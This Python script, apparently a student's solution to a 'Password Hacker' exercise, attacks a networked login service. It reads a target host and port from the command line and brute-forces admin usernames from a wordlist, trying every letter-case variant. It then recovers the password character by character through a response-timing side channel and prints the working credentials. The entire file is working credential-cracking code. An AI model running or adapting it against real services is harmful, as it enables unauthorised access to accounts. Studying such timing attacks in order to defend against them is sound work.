import socket
import sys
import itertools
import string
import json
from datetime import datetime


class Connect:
    def __init__(self, ip, pt):
        self.address = (ip, int(pt))
        self.admin_logins = 'D:\\python_environment\\Password Hacker\\Password Hacker\\Password Hacker' \
                            '\\Catching exception\\logins.txt'
        self.password_list = 'D:\\python_environment\\Password Hacker\\Password Hacker\\Password Hacker' \
                             '\\Catching exception\\passwords.txt'
        self.login_found = False
        self.login = ''
        self.found_letters = []

    def open_socket(self):
        with socket.socket() as client_socket:
            client_socket.connect(self.address)
            logins = iterate(get_dict(self.admin_logins))

            while self.login_found is False:
                for login in logins:
                    client_socket.send(convert_json(login).encode())
                    response_dict = decode_json(client_socket.recv(1024).decode())
                    if response_dict['result'] == 'Wrong password!':
                        self.login = login
                        self.login_found = True
                        break

            while True:
                letters = gen_letters()
                for p in letters:
                    if not self.found_letters:
                        password = p
                    else:
                        password = ''.join(self.found_letters) + p
                    start = datetime.now()
                    client_socket.send(convert_json(self.login, password).encode())
                    response_dict = decode_json(client_socket.recv(1024).decode())
                    finish = datetime.now()
                    difference = (finish - start).total_seconds()
                    if difference > 0.1:
                        self.found_letters.append(p)
                        break
                    if response_dict["result"] == 'Connection success!':
                        print(convert_json(self.login, password))
                        quit()


def gen_letters():
    items = string.ascii_letters + string.digits
    for i in items:
        yield i


def get_dict(file_path):
    with open(file_path, 'r') as pass_file:
        lines = pass_file.readlines()
        for line in lines:
            yield line


def iterate(dict_list):
    for item in dict_list:
        iterations = map(''.join, itertools.product(
            *zip(item.upper().strip('\n'), item.lower().strip('\n'))))
        for i in iterations:
            yield i


def convert_json(login, password=' '):
    login_json = {"login": f"{login}",
                  "password": f"{password}"}
    return json.dumps(login_json)


def decode_json(json_packet):
    return json.loads(json_packet)


def main():
    args = sys.argv
    hostname = args[1]
    port = args[2]
    Connect(hostname, port).open_socket()


if __name__ == '__main__':
    main()
